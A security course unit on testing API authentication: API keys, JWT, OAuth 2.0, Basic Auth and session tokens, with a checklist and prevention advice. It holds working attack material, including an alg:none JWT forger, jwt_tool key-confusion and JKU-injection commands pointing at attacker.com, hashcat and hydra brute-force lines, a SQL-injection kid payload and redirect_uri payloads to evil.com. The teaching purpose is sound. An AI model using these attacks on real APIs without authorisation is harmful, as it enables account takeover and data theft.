# Unit 11: API Security Testing - Topic 2: API Authentication Testing

## Overview

API authentication is the mechanism by which an API verifies the identity of the client making requests. Unlike traditional web applications that use sessions and cookies, APIs commonly use **tokens**, **API keys**, **OAuth**, and **JWT** for authentication. Testing API authentication involves identifying weaknesses in how credentials are issued, validated, stored, and revoked. Flawed API authentication is the **#1 API security risk** according to the OWASP API Security Top 10, and can lead to complete account takeover, data breaches, and unauthorized access.

---

## 1. API Authentication Mechanisms

### Common API Auth Methods

```
┌─────────────────────────────────────────────────────────────────────┐
│                   API Authentication Methods                        │
├─────────────────┬────────────────┬────────────┬────────────────────┤
│   API Keys      │  Bearer Tokens │   OAuth 2.0│   Basic Auth       │
├─────────────────┼────────────────┼────────────┼────────────────────┤
│ Static key in   │ JWT/opaque     │ Token-based│ Base64 encoded     │
│ header/query    │ token in       │ delegated  │ username:password  │
│ param           │ Auth header    │ access     │ in header          │
├─────────────────┼────────────────┼────────────┼────────────────────┤
│ x-api-key:      │ Authorization: │ OAuth flow │ Authorization:     │
│ abc123          │ Bearer eyJ...  │ → token    │ Basic dXNlcjpw...  │
└─────────────────┴────────────────┴────────────┴────────────────────┘

┌─────────────────┬────────────────┬────────────┬────────────────────┤
│   HMAC Signing  │  mTLS          │   HAWK     │   Digest Auth      │
├─────────────────┼────────────────┼────────────┼────────────────────┤
│ Request signed  │ Client cert    │ MAC-based  │ Challenge-response │
│ with shared     │ verification   │ HTTP auth  │ with nonce         │
│ secret          │                │            │                    │
└─────────────────┴────────────────┴────────────┴────────────────────┘
```

### Authentication Flow Comparison

| Method | Security Level | Stateless | Revocable | Use Case |
|--------|---------------|-----------|-----------|----------|
| **API Key** | Low | Yes | Regenerate | Public APIs, rate limiting |
| **Basic Auth** | Low | Yes | Change password | Internal/simple APIs |
| **Bearer Token** | Medium-High | Yes (JWT) | Token-dependent | General API auth |
| **OAuth 2.0** | High | Yes | Yes (refresh) | Third-party access |
| **HMAC** | High | Yes | Rotate key | Payment APIs, AWS |
| **mTLS** | Very High | Yes | Revoke cert | Service-to-service |

---

## 2. API Key Testing

### Finding Exposed API Keys

```bash
# Common header names for API keys
X-API-Key: <key>
X-Api-Key: <key>
Authorization: ApiKey <key>
Api-Key: <key>
apikey: <key>
X-Auth-Token: <key>
X-Access-Token: <key>

# Common query parameter names
?api_key=<key>
?apikey=<key>
?key=<key>
?token=<key>
?access_token=<key>

# Search for exposed API keys
# In JavaScript files
curl -s http://target.com/app.js | grep -iE "api[_-]?key|apikey|api[_-]?secret"

# In GitHub repositories
# GitHub search: "target.com" api_key
# Use truffleHog:
trufflehog github --repo=https://github.com/target/app

# In public Postman collections
# Search: https://www.postman.com/search?q=target.com

# In mobile apps
apktool d target.apk
grep -rn "api_key\|API_KEY\|apiKey" decompiled/
```

### API Key Attacks

```bash
# Test 1: Key in URL (logged in server logs, browser history, referrer)
GET /api/data?api_key=abc123 HTTP/1.1
# Key visible in server logs, proxy logs, analytics

# Test 2: No rate limiting per key
for i in $(seq 1 10000); do
    curl -s -H "X-API-Key: abc123" http://target.com/api/search?q=test$i &
done

# Test 3: Key rotation not enforced
# Old keys still work after generating new ones
curl -H "X-API-Key: OLD_KEY_HERE" http://target.com/api/data
# Still works? Old keys not revoked!

# Test 4: Key scope not limited
# Read-only key can perform write operations
curl -X DELETE -H "X-API-Key: read_only_key" http://target.com/api/users/1

# Test 5: Key enumeration
# Try predictable key patterns
curl -H "X-API-Key: test" http://target.com/api/data
curl -H "X-API-Key: admin" http://target.com/api/data
curl -H "X-API-Key: default" http://target.com/api/data

# Test 6: Key in error messages
curl http://target.com/api/data
# Response: {"error": "Missing API key. Use key: sk_test_..."}
```

---

## 3. Bearer Token / JWT Testing

### JWT Structure Analysis

```
JWT Token:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Decoded:
┌─────────────────────────────┐
│ Header (Base64)             │
│ {                           │
│   "alg": "HS256",          │
│   "typ": "JWT"             │
│ }                           │
├─────────────────────────────┤
│ Payload (Base64)            │
│ {                           │
│   "sub": "1234567890",     │
│   "name": "John Doe",     │
│   "role": "user",         │  ← Modify this!
│   "iat": 1516239022       │
│ }                           │
├─────────────────────────────┤
│ Signature                   │
│ HMACSHA256(                 │
│   base64UrlEncode(header) + │
│   "." +                     │
│   base64UrlEncode(payload), │
│   secret                    │
│ )                           │
└─────────────────────────────┘
```

### JWT Attack Techniques

```bash
# 1. Algorithm None Attack
# Change algorithm to "none" and remove signature
# Original: {"alg":"HS256","typ":"JWT"}
# Modified: {"alg":"none","typ":"JWT"}
# Then remove the signature part (after second dot)

python3 -c "
import base64, json

header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({'sub':'1','name':'admin','role':'admin','iat':1516239022}).encode()).rstrip(b'=')
token = header.decode() + '.' + payload.decode() + '.'
print(token)
"

# 2. Algorithm Confusion (HS256 vs RS256)
# If server uses RS256 (asymmetric), try HS256 with public key as secret
# Server verifies with: HMAC(token, public_key) ← public key is public!

# Get public key
openssl s_client -connect target.com:443 | openssl x509 -pubkey -noout > pubkey.pem

# Create token signed with public key using HS256
python3 jwt_tool.py <token> -X k -pk pubkey.pem

# 3. JWT Cracking (weak secrets)
# Using hashcat
hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt

# Using jwt_tool
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# Using jwt_cracker (Node.js)
jwt-cracker <token> -d /usr/share/wordlists/rockyou.txt

# 4. Key Injection (jwk header)
# Inject attacker's public key in the JWT header
python3 jwt_tool.py <token> -X i

# 5. JKU/x5u Header Injection
# Point to attacker-controlled JWKS endpoint
python3 jwt_tool.py <token> -X s -ju http://attacker.com/jwks.json

# 6. Kid (Key ID) Manipulation
# SQL injection via kid parameter
{"alg":"HS256","typ":"JWT","kid":"' UNION SELECT 'secret' -- "}

# Path traversal via kid
{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}
# Sign with empty string (dev/null)

# 7. Claim Modification
# Change role, userId, email in payload
python3 jwt_tool.py <token> -T  # Tamper mode
```

### jwt_tool Comprehensive Usage

```bash
# Install
git clone https://github.com/ticarpi/jwt_tool
pip3 install -r requirements.txt

# Decode JWT
python3 jwt_tool.py <token>

# Full scan (test all known vulnerabilities)
python3 jwt_tool.py <token> -M at -t "http://target.com/api/profile" \
  -rh "Authorization: Bearer"

# Tamper with claims
python3 jwt_tool.py <token> -T
# Then interactively modify claims

# Test algorithm none
python3 jwt_tool.py <token> -X a

# Test key confusion
python3 jwt_tool.py <token> -X k -pk public.pem

# Brute force secret
python3 jwt_tool.py <token> -C -d wordlist.txt

# Inject new key pair
python3 jwt_tool.py <token> -X i

# Sign with known secret
python3 jwt_tool.py <token> -S hs256 -p "secret_key"
```

---

## 4. OAuth 2.0 Testing

### OAuth 2.0 Flows

```
Authorization Code Flow:
┌────────┐     ┌────────────┐     ┌────────────┐     ┌──────────┐
│  User  │     │  Client    │     │  Auth      │     │ Resource │
│        │     │  App       │     │  Server    │     │ Server   │
└───┬────┘     └─────┬──────┘     └─────┬──────┘     └────┬─────┘
    │                │                   │                  │
    │ 1. Click       │                   │                  │
    │   "Login"      │                   │                  │
    │───────────────►│                   │                  │
    │                │ 2. Redirect to    │                  │
    │                │    Auth Server    │                  │
    │◄───────────────│                   │                  │
    │ 3. Login &     │                   │                  │
    │    Consent     │                   │                  │
    │───────────────────────────────────►│                  │
    │                │                   │                  │
    │ 4. Auth Code   │                   │                  │
    │◄───────────────────────────────────│                  │
    │───────────────►│                   │                  │
    │                │ 5. Exchange code  │                  │
    │                │    for token      │                  │
    │                │──────────────────►│                  │
    │                │                   │                  │
    │                │ 6. Access Token   │                  │
    │                │◄──────────────────│                  │
    │                │                   │                  │
    │                │ 7. API Request    │                  │
    │                │   with token      │                  │
    │                │─────────────────────────────────────►│
    │                │                   │                  │
    │                │ 8. API Response   │                  │
    │                │◄─────────────────────────────────────│
```

### OAuth 2.0 Attack Vectors

```bash
# 1. Open Redirect in redirect_uri
# Normal: redirect_uri=https://app.com/callback
# Attack: redirect_uri=https://evil.com/steal
# Steal authorization code via redirect

# Test variations:
redirect_uri=https://evil.com
redirect_uri=https://app.com.evil.com
redirect_uri=https://app.com@evil.com
redirect_uri=https://app.com%40evil.com/callback
redirect_uri=https://app.com/callback/../../../evil
redirect_uri=https://app.com/callback?next=https://evil.com

# 2. CSRF on OAuth callback
# No state parameter = CSRF possible
# Attacker initiates OAuth flow → gets auth code
# Sends callback URL to victim
# Victim's account linked to attacker's OAuth

# Test: Remove 'state' parameter from request
# Does the flow still work?

# 3. Authorization Code Reuse
# Use same auth code multiple times
GET /callback?code=AUTH_CODE&state=abc
# Use code again
POST /token?code=AUTH_CODE&grant_type=authorization_code
# Should be one-time use!

# 4. Token Leakage via Referrer
# If access_token is in URL fragment (#access_token=...)
# Navigate to external page → token in Referrer header

# 5. Scope Escalation
# Request more scopes than authorized
POST /token
grant_type=authorization_code
&code=AUTH_CODE
&scope=read write admin  # Added 'admin' scope!

# 6. Client Secret Exposure
# Mobile apps or SPAs with embedded client_secret
# Decompile app or check JavaScript source
```

### Testing OAuth Implementation

```bash
# Check for state parameter
# Capture OAuth initiation request
GET /auth?client_id=xxx&redirect_uri=xxx&scope=read&response_type=code
# Is 'state' parameter present? Is it validated on callback?

# Test redirect_uri validation
# Try modifying redirect_uri in various ways:
# Subdomain: https://evil.app.com/callback
# Path traversal: https://app.com/callback/../../evil
# Parameter pollution: redirect_uri=https://app.com/callback&redirect_uri=https://evil.com
# Encoded: redirect_uri=https://app.com%2f%2fevil.com

# Test token expiration
# Save access token
# Wait for expected expiration time
# Try using expired token
curl -H "Authorization: Bearer EXPIRED_TOKEN" http://target.com/api/data

# Test refresh token rotation
# Use refresh token to get new access token
# Try using the old refresh token again
# Should be invalidated after use!
```

---

## 5. Basic Auth and Session-Based API Testing

### Basic Authentication Attacks

```bash
# Basic Auth sends credentials in every request
# Base64 encoded (NOT encrypted!)
Authorization: Basic dXNlcjpwYXNzd29yZA==
# Decodes to: user:password

# Brute force Basic Auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-get /api/admin

# Test default credentials
for cred in admin:admin admin:password root:root test:test; do
    user=$(echo $cred | cut -d: -f1)
    pass=$(echo $cred | cut -d: -f2)
    token=$(echo -n "$user:$pass" | base64)
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -H "Authorization: Basic $token" http://target.com/api/)
    echo "$code - $user:$pass"
done

# Basic Auth over HTTP = credentials in plaintext!
# Always require HTTPS for Basic Auth
```

### Session Token Testing

```bash
# Test session token randomness
# Collect 100 session tokens
for i in $(seq 1 100); do
    curl -s -c - http://target.com/api/login \
      -d '{"user":"test","pass":"test"}' | grep session
done > tokens.txt

# Analyze for patterns
# Are tokens sequential? Predictable? Time-based?
# Use Burp Sequencer for statistical analysis

# Test session fixation
# Can you set a session token before authentication?
curl -b "session=attacker_token" \
  -d '{"user":"victim","pass":"victim_pass"}' \
  http://target.com/api/login
# Does the server accept the pre-set token?

# Test session invalidation
# After logout, is the token still valid?
curl -X POST http://target.com/api/logout -H "Authorization: Bearer TOKEN"
curl http://target.com/api/data -H "Authorization: Bearer TOKEN"
# Should return 401!
```

---

## 6. Testing Methodology

### API Authentication Testing Checklist

```
┌──────────────────────────────────────────────────────────────┐
│ API Authentication Testing Checklist                          │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│ □ Identify all authentication mechanisms used                │
│ □ Test for missing authentication on endpoints               │
│ □ Test authentication bypass (remove token, empty token)     │
│ □ Test default/weak credentials                              │
│ □ Test brute force resistance (rate limiting, lockout)        │
│ □ Test token expiration and rotation                         │
│ □ Test token revocation (logout invalidation)                │
│ □ Test JWT-specific attacks (none alg, confusion, cracking)  │
│ □ Test OAuth flow (redirect_uri, state, scope)               │
│ □ Test API key scope and permissions                         │
│ □ Test credential storage (client-side exposure)             │
│ □ Test password reset API endpoints                          │
│ □ Test token leakage (logs, URLs, referrer)                  │
│ □ Test cross-origin token usage                              │
│ □ Test privilege escalation via token manipulation           │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### Common Authentication Bypass Techniques

| Technique | Example | Impact |
|-----------|---------|--------|
| **Remove auth header** | Delete `Authorization` header | Access without auth |
| **Empty token** | `Authorization: Bearer ` | Bypass token check |
| **Null token** | `Authorization: Bearer null` | Logic bypass |
| **Admin token guess** | `Authorization: Bearer admin` | Privilege escalation |
| **Method change** | GET → POST (or vice versa) | Different auth checks |
| **Path manipulation** | `/api/v1/admin` → `/api/v1/Admin` | Case-sensitive bypass |
| **Content-Type change** | JSON → form-data | Different processing |
| **Add X-Original-URL** | `X-Original-URL: /admin` | Proxy/WAF bypass |

---

## 7. Prevention Best Practices

### Secure API Authentication Design

| Practice | Implementation |
|----------|---------------|
| **Use standard protocols** | OAuth 2.0, OpenID Connect for user auth |
| **Strong tokens** | Cryptographically random, sufficient length (256-bit) |
| **Short expiration** | Access tokens: 15-60 minutes |
| **Token rotation** | Rotate refresh tokens on each use |
| **Secure storage** | Server-side session, httpOnly cookies |
| **Transport security** | Always HTTPS, HSTS headers |
| **Rate limiting** | Limit auth attempts per IP/account |
| **Key management** | Rotate API keys regularly, scope permissions |
| **Audit logging** | Log all authentication events |
| **Multi-factor** | MFA for sensitive operations |

---

## Summary Table

| Concept | Key Points |
|---------|------------|
| **API Keys** | Static, often exposed; test scope, rotation, enumeration |
| **JWT** | Algorithm attacks (none, confusion), cracking, claim tampering |
| **OAuth 2.0** | redirect_uri bypass, state CSRF, scope escalation |
| **Basic Auth** | Base64 (not encryption), brute force, HTTPS required |
| **Token Testing** | Expiration, revocation, randomness, fixation |
| **Auth Bypass** | Remove header, empty token, method change, path manipulation |
| **Prevention** | Strong tokens, short expiry, rate limiting, MFA |

---

## Revision Questions

1. Compare API key authentication with JWT bearer tokens. What are the security trade-offs?
2. Explain the JWT "algorithm none" attack and "algorithm confusion" attack. How do they differ?
3. Describe three attack vectors against OAuth 2.0's authorization code flow.
4. How would you test whether an API properly invalidates tokens after logout?
5. What is the difference between the `state` parameter and PKCE in OAuth 2.0? Why are both important?
6. Design a secure API authentication system — what mechanisms and controls would you implement?

---

*Previous: [01-api-reconnaissance.md](01-api-reconnaissance.md) | Next: [03-rate-limiting.md](03-rate-limiting.md)*

---

*[Back to README](../README.md)*
